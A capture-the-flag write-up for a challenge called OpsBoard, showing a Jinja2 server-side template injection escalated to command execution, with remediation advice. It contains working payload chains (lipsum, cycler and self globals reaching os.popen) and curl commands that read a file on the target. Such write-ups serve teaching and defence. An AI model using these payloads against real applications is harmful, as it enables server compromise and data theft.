# OpsBoard - server-side template injection (Jinja2) → RCE

| | |
|---|---|
| **Challenge** | OpsBoard |
| **Category** | INJ (ssti) |
| **Points / Difficulty** | 150 / medium |
| **Target** | http://inj3.chal.deti:8042 |
| **Bug** | CWE-94 - server-side template injection (Jinja2) |

## Hint
> Write the header by hand; the page obeys your marks, even the ones you test.

## Recon
`POST /report` with field `header`; default `{{ report_date }} - Aev Store`. The
header is rendered **as a Jinja2 template**, not a string substitution.

**Discriminator:** `{{7*7}}` → **`49`** (evaluated) ⇒ SSTI (if it echoed `{{7*7}}`
literally it'd be safe string interpolation).

## Approach
Jinja2 ships global objects that reach their defining module. `lipsum` is a
built-in whose module imports `os`, so `lipsum.__globals__.os` → `popen` → RCE.

```
{{ lipsum.__globals__.os.popen('cat /flag/flag').read() }}
```

## Exploitation
```bash
# confirm
curl -s --data-urlencode "header={{7*7}}" http://inj3.chal.deti:8042/report | grep -o 49
# RCE -> flag
curl -s --data-urlencode "header={{ lipsum.__globals__.os.popen('cat /flag/flag').read() }}" \
  http://inj3.chal.deti:8042/report | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{4ff1abbcecf38b590d644a89bcbfe145}
```

## For the report
- **Recon test + result:** `{{7*7}}` → `49` - the engine executed the input, so
  the header field is template *code*, not data.
- **Chain used:** `lipsum.__globals__.os.popen('cat /flag/flag').read()` - a
  Jinja2 built-in global → its module's `os` → `popen`. (Equivalent chains:
  `cycler.__init__.__globals__.os…`, or
  `self.__init__.__globals__.__builtins__.__import__('os')…`.)
- **Fix:** render user text as **data in a fixed template with a data slot**
  (`render_template_string("{{ h }}", h=user)` - pass it as a *variable*, never
  as the template), never `render_template_string(user)`. If user-authored
  templates are a real requirement, use a **sandboxed** engine with an allowlist
  of reachable attributes/objects.

## Root cause & remediation
- **Cause:** untrusted input is compiled/executed as a template (CWE-94); the SSTI
  = XSS's server-side cousin - same `{{ }}` shape, but executed on the server with
  the service's privileges before the page is sent.
- **Fix:** see report note above; also run the app unprivileged and keep secrets
  off the app host.
